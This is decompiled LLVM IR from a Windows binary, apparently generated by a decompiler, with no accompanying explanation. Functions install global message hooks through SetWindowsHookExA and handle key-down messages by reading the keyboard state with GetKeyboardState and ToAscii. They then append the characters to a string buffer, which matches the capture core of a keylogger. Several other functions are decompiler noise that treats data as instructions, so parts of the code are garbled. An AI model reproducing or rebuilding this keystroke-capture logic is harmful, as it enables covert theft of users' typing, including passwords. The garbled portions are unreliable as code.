define i32 @function_405398(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_405398:
  %merge.reg2mem = alloca i32, !insn.addr !738
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !738
  br i1 %10, label %dec_label_pc_4053c7, label %dec_label_pc_40539a, !insn.addr !738

dec_label_pc_40539a:                              ; preds = %dec_label_pc_405398
  br i1 %8, label %dec_label_pc_4053d0, label %dec_label_pc_40539d, !insn.addr !739

dec_label_pc_40539d:                              ; preds = %dec_label_pc_40539a
  %11 = trunc i32 %4 to i16, !insn.addr !740
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !740
  %13 = inttoptr i32 %0 to i8*, !insn.addr !740
  store i8 %12, i8* %13, align 1, !insn.addr !740
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !741
  store i8 %14, i8* %13, align 1, !insn.addr !741
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !742
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !742
  %19 = add i8 %16, %18, !insn.addr !742
  %20 = inttoptr i32 %17 to i8*, !insn.addr !742
  store i8 %19, i8* %20, align 1, !insn.addr !742
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !743
  %21 = trunc i32 %arg10 to i16, !insn.addr !744
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !744
  %23 = inttoptr i32 %9 to i32*, !insn.addr !744
  store i32 %22, i32* %23, align 4, !insn.addr !744
  store i32 %arg1, i32* %eax, align 4, !insn.addr !745
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !746
  %25 = load i8, i8* %24, align 1, !insn.addr !746
  %26 = trunc i32 %arg1 to i8, !insn.addr !746
  %27 = add i8 %25, %26, !insn.addr !746
  store i8 %27, i8* %24, align 1, !insn.addr !746
  %28 = trunc i32 %arg3 to i16, !insn.addr !747
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !747
  %30 = load i32, i32* %29, align 4, !insn.addr !747
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !747
  %31 = add i32 %arg5, 67, !insn.addr !748
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !748
  %34 = load i32, i32* %33, align 4, !insn.addr !748
  %35 = load i8, i8* %24, align 1, !insn.addr !749
  %36 = add i8 %35, %26, !insn.addr !749
  store i8 %36, i8* %24, align 1, !insn.addr !749
  %37 = mul i32 %34, 1557718248, !insn.addr !750
  %38 = add i32 %arg7, 97, !insn.addr !750
  %39 = add i32 %38, %37, !insn.addr !750
  %40 = inttoptr i32 %39 to i8*, !insn.addr !750
  %41 = load i8, i8* %40, align 1, !insn.addr !750
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !750
  %44 = add i8 %43, %41, !insn.addr !750
  %45 = icmp eq i8 %44, 0, !insn.addr !750
  store i8 %44, i8* %40, align 1, !insn.addr !750
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !751
  br i1 %45, label %dec_label_pc_405439, label %dec_label_pc_4053c7, !insn.addr !751

dec_label_pc_4053c7:                              ; preds = %dec_label_pc_405398, %dec_label_pc_40539d
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !752

dec_label_pc_4053d0:                              ; preds = %dec_label_pc_40539a
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !753
  %49 = inttoptr i32 %6 to i8*, !insn.addr !753
  store i8 %48, i8* %49, align 1, !insn.addr !753
  %50 = add i32 %3, 104, !insn.addr !754
  %51 = inttoptr i32 %50 to i8*, !insn.addr !754
  %52 = load i8, i8* %51, align 1, !insn.addr !754
  %53 = udiv i32 %4, 256, !insn.addr !754
  %54 = trunc i32 %53 to i8, !insn.addr !754
  %55 = add i8 %52, %54, !insn.addr !754
  store i8 %55, i8* %51, align 1, !insn.addr !754
  %56 = trunc i32 %4 to i16, !insn.addr !755
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !755
  %58 = inttoptr i32 %0 to i8*, !insn.addr !755
  store i8 %57, i8* %58, align 1, !insn.addr !755
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !756
  store i8 %59, i8* %58, align 1, !insn.addr !756
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !757
  store i8 %60, i8* %58, align 1, !insn.addr !757
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !758
  store i8 %61, i8* %58, align 1, !insn.addr !758
  %62 = load i8, i8* %51, align 1, !insn.addr !759
  %63 = trunc i32 %4 to i8, !insn.addr !759
  %64 = add i8 %62, %63, !insn.addr !759
  store i8 %64, i8* %51, align 1, !insn.addr !759
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !760
  store i8 %65, i8* %58, align 1, !insn.addr !760
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !761
  store i8 %66, i8* %58, align 1, !insn.addr !761
  %67 = add i32 %2, 1, !insn.addr !762
  %68 = icmp slt i32 %67, 0, !insn.addr !762
  br i1 %68, label %dec_label_pc_405451, label %dec_label_pc_4053ec, !insn.addr !763

dec_label_pc_4053ec:                              ; preds = %dec_label_pc_4053d0
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !764
  %72 = xor i32 %4, %1, !insn.addr !765
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !766
  %75 = inttoptr i32 %74 to i16*, !insn.addr !766
  %76 = load i16, i16* %75, align 2, !insn.addr !766
  %77 = trunc i32 %72 to i16, !insn.addr !766
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !766
  %78 = load i8, i8* %73, align 4, !insn.addr !767
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !767
  %81 = add i8 %78, %80, !insn.addr !767
  %82 = inttoptr i32 %79 to i8*, !insn.addr !767
  store i8 %81, i8* %82, align 1, !insn.addr !767
  %83 = add i32 %71, 82, !insn.addr !768
  %84 = inttoptr i32 %83 to i8*, !insn.addr !768
  %85 = load i8, i8* %84, align 1, !insn.addr !768
  %86 = add i8 %85, %63, !insn.addr !768
  store i8 %86, i8* %84, align 1, !insn.addr !768
  %87 = load i32, i32* %eax, align 4, !insn.addr !769
  %88 = add i32 %87, -1, !insn.addr !769
  %89 = add i32 %71, 4227325, !insn.addr !770
  %90 = inttoptr i32 %89 to i8*, !insn.addr !770
  %91 = load i8, i8* %90, align 1, !insn.addr !770
  %92 = udiv i32 %88, 256, !insn.addr !770
  %93 = trunc i32 %92 to i8, !insn.addr !770
  %94 = add i8 %91, %93, !insn.addr !770
  store i8 %94, i8* %90, align 1, !insn.addr !770
  ret i32 %88, !insn.addr !770

dec_label_pc_405439:                              ; preds = %dec_label_pc_40539d
  %95 = add i32 %46, 1, !insn.addr !771
  store i32 %95, i32* %eax, align 4, !insn.addr !771
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !772
  %97 = load i8, i8* %96, align 1, !insn.addr !772
  %98 = udiv i32 %arg3, 256, !insn.addr !772
  %99 = trunc i32 %98 to i8, !insn.addr !772
  %100 = add i8 %97, %99, !insn.addr !772
  store i8 %100, i8* %96, align 1, !insn.addr !772
  %101 = add i32 %arg3, 89, !insn.addr !773
  %102 = inttoptr i32 %101 to i8*, !insn.addr !773
  store i8 -1, i8* %102, align 1, !insn.addr !773
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !774
  %103 = load i32, i32* %eax, align 4, !insn.addr !775
  ret i32 %103, !insn.addr !775

dec_label_pc_405451:                              ; preds = %dec_label_pc_4053d0
  %104 = load i32, i32* %eax, align 4, !insn.addr !776
  ret i32 %104, !insn.addr !776
}

define i32 @function_405454() local_unnamed_addr {
dec_label_pc_405454:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !777
  %2 = add i32 %1, -1, !insn.addr !777
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !777
  ret i32 %0, !insn.addr !778
}

define i32 @function_40545c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40545c:
  %esp.0.reg2mem = alloca i32, !insn.addr !779
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !780
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !780
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !780
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !781
  %4 = call i32 @function_407744(), !insn.addr !782
  %5 = icmp ne i32 %4, 0, !insn.addr !783
  %6 = icmp eq i1 %5, false, !insn.addr !784
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !785
  br i1 %6, label %dec_label_pc_405557, label %dec_label_pc_405499, !insn.addr !785

dec_label_pc_405499:                              ; preds = %dec_label_pc_40545c
  switch i32 %0, label %dec_label_pc_4054e3 [
    i32 8, label %dec_label_pc_4054a7
    i32 46, label %dec_label_pc_4054c6
  ]

dec_label_pc_4054a7:                              ; preds = %dec_label_pc_405499
  %7 = call i32 @function_4077e0(), !insn.addr !786
  %8 = call i32 @"@LStrDelete"(), !insn.addr !787
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !788
  br label %dec_label_pc_405557, !insn.addr !788

dec_label_pc_4054c6:                              ; preds = %dec_label_pc_405499
  %9 = call i32 @function_4077e0(), !insn.addr !789
  %10 = call i32 @"@LStrDelete"(), !insn.addr !790
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !791
  br label %dec_label_pc_405557, !insn.addr !791

dec_label_pc_4054e3:                              ; preds = %dec_label_pc_405499
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !792
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !793
  %14 = udiv i32 %1, 65536, !insn.addr !794
  %15 = and i32 %14, 255, !insn.addr !795
  %16 = inttoptr i32 %15 to i16*, !insn.addr !796
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !797
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !798
  %19 = icmp eq i32 %18, 1, !insn.addr !799
  %20 = icmp eq i1 %19, false, !insn.addr !800
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !800
  br i1 %20, label %dec_label_pc_405557, label %dec_label_pc_40550f, !insn.addr !800

dec_label_pc_40550f:                              ; preds = %dec_label_pc_4054e3
  %21 = call i32 @function_4074a8(), !insn.addr !801
  %22 = icmp eq i32 %21, 0, !insn.addr !802
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !803
  br i1 %22, label %dec_label_pc_405557, label %dec_label_pc_40551b, !insn.addr !803

dec_label_pc_40551b:                              ; preds = %dec_label_pc_40550f
  %23 = call i32 @function_4034c8(), !insn.addr !804
  %24 = icmp sgt i32 %23, 15, !insn.addr !805
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !805
  br i1 %24, label %dec_label_pc_405557, label %dec_label_pc_40552c, !insn.addr !805

dec_label_pc_40552c:                              ; preds = %dec_label_pc_40551b
  %25 = call i32 @function_4077e0(), !insn.addr !806
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !807
  %27 = call i32 @"@LStrInsert"(), !insn.addr !808
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !808
  br label %dec_label_pc_405557, !insn.addr !808

dec_label_pc_405557:                              ; preds = %dec_label_pc_40552c, %dec_label_pc_40551b, %dec_label_pc_40550f, %dec_label_pc_4054e3, %dec_label_pc_4054c6, %dec_label_pc_4054a7, %dec_label_pc_40545c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !809
  %29 = load i32, i32* %28, align 4, !insn.addr !809
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !810
  %30 = add i32 %esp.0.reload, 8, !insn.addr !811
  %31 = inttoptr i32 %30 to i32*, !insn.addr !811
  store i32 4216183, i32* %31, align 4, !insn.addr !811
  %32 = call i32 @"@LStrClr"(), !insn.addr !812
  ret i32 %32, !insn.addr !813
}

define i32 @function_405570() local_unnamed_addr {
dec_label_pc_405570:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !814
  ret i32 %0, !insn.addr !814
}

define i32 @function_405575() local_unnamed_addr {
dec_label_pc_405575:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !815
}

define i32 @function_405577(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405577:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !816
}

define i32 @function_405580(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405580:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !817
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !817
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !817
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !818
  %2 = call i32 @function_407744(), !insn.addr !819
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !820
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !821
  %4 = add i32 %1, 8, !insn.addr !822
  %5 = inttoptr i32 %4 to i32*, !insn.addr !822
  store i32 4216390, i32* %5, align 4, !insn.addr !822
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !823
  ret i32 %6, !insn.addr !824
}

define i32 @function_40563f() local_unnamed_addr {
dec_label_pc_40563f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !825
  ret i32 %0, !insn.addr !825
}

define i32 @function_405644() local_unnamed_addr {
dec_label_pc_405644:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !826
}

define i32 @function_405646(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405646:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !827
}

define i32 @function_40564c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40564c:
  %esp.0.reg2mem = alloca i32, !insn.addr !828
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !829
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !829
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !829
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !830
  %3 = call i32 @function_4076b4(), !insn.addr !831
  %4 = icmp eq i32 %3, 0, !insn.addr !832
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !833
  br i1 %4, label %dec_label_pc_4056b0, label %dec_label_pc_40566d, !insn.addr !833

dec_label_pc_40566d:                              ; preds = %dec_label_pc_40564c
  %5 = inttoptr i32 %0 to i8*, !insn.addr !834
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_4056d4 to i32*), i8* null, i8* %5), !insn.addr !835
  %7 = ptrtoint i32* %6 to i32, !insn.addr !835
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !836
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !836
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !837
  %10 = icmp eq i1 %9, false, !insn.addr !838
  br i1 %10, label %dec_label_pc_4056ab, label %dec_label_pc_405688, !insn.addr !839

dec_label_pc_405688:                              ; preds = %dec_label_pc_40566d
  %11 = call i32 @function_407514(), !insn.addr !840
  %12 = call i32 @"@LStrAsg"(), !insn.addr !841
  %13 = call i32 @function_40783c(), !insn.addr !842
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !843
  br label %dec_label_pc_4056b0, !insn.addr !843

dec_label_pc_4056ab:                              ; preds = %dec_label_pc_40566d
  %14 = call i32 @function_407970(), !insn.addr !844
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !844
  br label %dec_label_pc_4056b0, !insn.addr !844

dec_label_pc_4056b0:                              ; preds = %dec_label_pc_4056ab, %dec_label_pc_405688, %dec_label_pc_40564c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !845
  %16 = load i32, i32* %15, align 4, !insn.addr !845
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !846
  %17 = add i32 %esp.0.reload, 8, !insn.addr !847
  %18 = inttoptr i32 %17 to i32*, !insn.addr !847
  store i32 4216525, i32* %18, align 4, !insn.addr !847
  %19 = call i32 @"@LStrClr"(), !insn.addr !848
  ret i32 %19, !insn.addr !849
}

define i32 @function_4056c6() local_unnamed_addr {
dec_label_pc_4056c6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !850
  ret i32 %0, !insn.addr !850
}

define i32 @function_4056cb() local_unnamed_addr {
dec_label_pc_4056cb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !851
}

define i32 @function_4056cd(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4056cd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !852
}

define i32 @function_4056d1() local_unnamed_addr {
dec_label_pc_4056d1:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !853
  %8 = inttoptr i32 %4 to i8*, !insn.addr !853
  store i8 %7, i8* %8, align 1, !insn.addr !853
  %9 = add i32 %2, 111, !insn.addr !854
  %10 = inttoptr i32 %9 to i8*, !insn.addr !854
  %11 = load i8, i8* %10, align 1, !insn.addr !854
  %12 = load i32, i32* %eax, align 4, !insn.addr !854
  %13 = trunc i32 %12 to i8, !insn.addr !854
  %14 = add i8 %11, %13, !insn.addr !854
  store i8 %14, i8* %10, align 1, !insn.addr !854
  %15 = trunc i32 %3 to i16, !insn.addr !855
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !855
  %17 = inttoptr i32 %0 to i32*, !insn.addr !855
  store i32 %16, i32* %17, align 4, !insn.addr !855
  %18 = add i32 %0, 66, !insn.addr !856
  %19 = inttoptr i32 %18 to i64*, !insn.addr !856
  %20 = load i64, i64* %19, align 4, !insn.addr !856
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !856
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !857
  %22 = load i8, i8* %5, align 4, !insn.addr !858
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !858
  %25 = add i8 %22, %24, !insn.addr !858
  %26 = inttoptr i32 %23 to i8*, !insn.addr !858
  store i8 %25, i8* %26, align 1, !insn.addr !858
  %27 = add i32 %21, -117, !insn.addr !859
  %28 = inttoptr i32 %27 to i8*, !insn.addr !859
  %29 = load i8, i8* %28, align 1, !insn.addr !859
  %30 = trunc i32 %3 to i8, !insn.addr !859
  %31 = add i8 %29, %30, !insn.addr !859
  store i8 %31, i8* %28, align 1, !insn.addr !859
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !860
  %33 = add i32 %21, 16, !insn.addr !861
  %34 = inttoptr i32 %33 to i32*, !insn.addr !861
  %35 = load i32, i32* %34, align 4, !insn.addr !861
  %36 = add i32 %21, 12, !insn.addr !862
  %37 = inttoptr i32 %36 to i32*, !insn.addr !862
  %38 = load i32, i32* %37, align 4, !insn.addr !862
  %39 = add i32 %21, 8, !insn.addr !863
  %40 = inttoptr i32 %39 to i32*, !insn.addr !863
  %41 = load i32, i32* %40, align 4, !insn.addr !863
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !864
  %43 = inttoptr i32 %42 to i32*, !insn.addr !865
  %44 = load i32, i32* %43, align 4, !insn.addr !865
  %45 = icmp eq i32 %44, 0, !insn.addr !865
  %46 = icmp eq i1 %45, false, !insn.addr !866
  %47 = icmp eq i32 %41, 0, !insn.addr !867
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !868
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_405707, label %dec_label_pc_405736, !insn.addr !869

dec_label_pc_405707:                              ; preds = %dec_label_pc_4056d1
  store i32 %35, i32* %eax, align 4, !insn.addr !870
  %51 = add i32 %35, 4, !insn.addr !871
  %52 = inttoptr i32 %51 to i32*, !insn.addr !871
  %53 = load i32, i32* %52, align 4, !insn.addr !871
  switch i32 %53, label %dec_label_pc_405736 [
    i32 256, label %dec_label_pc_40571e
    i32 770, label %dec_label_pc_40572f
  ]

dec_label_pc_40571e:                              ; preds = %dec_label_pc_405707
  %54 = call i32 @function_40545c(i32 %2, i32 %1, i32 %0), !insn.addr !872
  br label %dec_label_pc_405736, !insn.addr !873

dec_label_pc_40572f:                              ; preds = %dec_label_pc_405707
  %55 = call i32 @function_405580(i32 %2, i32 %1, i32 %0), !insn.addr !874
  br label %dec_label_pc_405736, !insn.addr !874

dec_label_pc_405736:                              ; preds = %dec_label_pc_4056d1, %dec_label_pc_405707, %dec_label_pc_40572f, %dec_label_pc_40571e
  %56 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !875
  %57 = inttoptr i32 %35 to i32*, !insn.addr !876
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !876
  ret i32 %58, !insn.addr !877
}

define i32 @function_40574c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40574c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !878
  %5 = icmp eq i1 %4, false, !insn.addr !879
  %6 = icmp eq i32 %arg3, 0, !insn.addr !880
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_40576a, label %dec_label_pc_40577c, !insn.addr !881

dec_label_pc_40576a:                              ; preds = %dec_label_pc_40574c
  %8 = add i32 %arg1, 8, !insn.addr !882
  %9 = inttoptr i32 %8 to i32*, !insn.addr !882
  %10 = load i32, i32* %9, align 4, !insn.addr !882
  %11 = icmp eq i32 %10, 2, !insn.addr !883
  %12 = icmp eq i1 %11, false, !insn.addr !884
  br i1 %12, label %dec_label_pc_40577c, label %dec_label_pc_405774, !insn.addr !884

dec_label_pc_405774:                              ; preds = %dec_label_pc_40576a
  %13 = call i32 @function_40564c(i32 %1, i32 %2, i32 %0), !insn.addr !885
  br label %dec_label_pc_40577c, !insn.addr !885

dec_label_pc_40577c:                              ; preds = %dec_label_pc_40574c, %dec_label_pc_405774, %dec_label_pc_40576a
  %14 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !886
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !887
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !887
  ret i32 %16, !insn.addr !888
}

define i32 @function_405794() local_unnamed_addr {
dec_label_pc_405794:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4216544 to i32*), i32 3), !insn.addr !889
  %2 = ptrtoint i32* %1 to i32, !insn.addr !889
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !890
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216652 to i32*), i32 4), !insn.addr !891
  %5 = ptrtoint i32* %4 to i32, !insn.addr !891
  store i32 %5, i32* @global_var_4096b4, align 4, !insn.addr !892
  ret i32 %5, !insn.addr !893
}

define i32 @function_4057cc() local_unnamed_addr {
dec_label_pc_4057cc:
  %0 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !894
  %1 = inttoptr i32 %0 to i32*, !insn.addr !895
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !895
  %3 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !896
  %4 = inttoptr i32 %3 to i32*, !insn.addr !897
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !897
  %6 = sext i1 %5 to i32, !insn.addr !897
  ret i32 %6, !insn.addr !898
}

define i32 @function_4057e4() local_unnamed_addr {
dec_label_pc_4057e4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !899
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !899
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !899
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !900
  %2 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !901
  %3 = add i32 %2, 1, !insn.addr !901
  store i32 %3, i32* @global_var_4096ac, align 4, !insn.addr !901
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !902
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !903
  ret i32 0, !insn.addr !904
}

define i32 @function_405809() local_unnamed_addr {
dec_label_pc_405809:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !905
  ret i32 %0, !insn.addr !905
}

define i32 @function_40580e() local_unnamed_addr {
dec_label_pc_40580e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !906
}

define i32 @function_405810(i32 %arg1) local_unnamed_addr {
dec_label_pc_405810:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !907
}

define i32 @function_405814() local_unnamed_addr {
dec_label_pc_405814:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !908
  %2 = add i32 %1, -1, !insn.addr !908
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !908
  ret i32 %0, !insn.addr !909
}

define i32 @function_40581f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40581f:
  %storemerge.reg2mem = alloca i32, !insn.addr !910
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !910
  %5 = inttoptr i32 %3 to i32*, !insn.addr !910
  store i32 %4, i32* %5, align 4, !insn.addr !910
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !911
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !911
  %10 = add i8 %7, %9, !insn.addr !911
  %11 = inttoptr i32 %8 to i8*, !insn.addr !911
  store i8 %10, i8* %11, align 1, !insn.addr !911
  %12 = load i32, i32* %eax, align 4, !insn.addr !912
  store i32 %arg1, i32* %eax, align 4, !insn.addr !913
  %13 = add i32 %12, 99, !insn.addr !914
  %14 = inttoptr i32 %13 to i64*, !insn.addr !914
  %15 = load i64, i64* %14, align 4, !insn.addr !914
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !914
  %17 = add i32 %16, -2, !insn.addr !915
  %18 = inttoptr i32 %17 to i16*, !insn.addr !915
  store i16 27241, i16* %18, align 2, !insn.addr !915
  %19 = mul i32 %2, 2, !insn.addr !916
  %20 = add i32 %2, 110, !insn.addr !916
  %21 = add i32 %20, %19, !insn.addr !916
  %22 = inttoptr i32 %21 to i32*, !insn.addr !916
  %23 = load i32, i32* %22, align 4, !insn.addr !916
  %24 = sext i32 %23 to i64, !insn.addr !916
  %25 = mul nsw i64 %24, 111, !insn.addr !916
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !916
  %28 = icmp eq i64 %25, %27, !insn.addr !916
  br i1 %28, label %dec_label_pc_405851, label %dec_label_pc_4058c0, !insn.addr !917

dec_label_pc_405851:                              ; preds = %dec_label_pc_40581f
  %29 = icmp eq i32 %0, 0, !insn.addr !918
